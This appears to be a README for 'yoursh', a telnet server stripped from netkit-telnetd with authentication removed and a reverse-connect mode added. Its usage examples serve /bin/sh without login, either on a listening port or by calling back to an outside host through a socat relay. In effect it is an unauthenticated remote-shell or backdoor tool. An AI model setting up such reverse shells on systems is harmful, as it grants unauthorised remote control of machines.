Your Shell
==========
从 netkit-telnetd 项目简化出的一个telnet服务端，身份认证等功能已经从源码中移除
额外添加了反弹链接功能
# 使用方法

	yoursh [-l port | -r host:port] [-L program] [-n] [-h]
	-l port     Bind the <port> and listen, default port 80. (default option)
	-r          Reverse connect to the <port> of speciafied <host>, it is essential to make port forwarding.
	-L program  Login program, default '/bin/sh'.
	-n          Keep connection alive.
	-h          Help

# 构建

使用 `make` 命令构建

# 用例

	$ yoursh -l 10023 -n
	## 监听 10023 端口并开启续命

	$ yoursh -r 123.123.123.123:9998 
	## 运行 `socat tcp4-listen:9998 tcp4-listen:9999` 在主机 123.123.123.123, 
	## 9999端口是 telnet 服务端接入端口


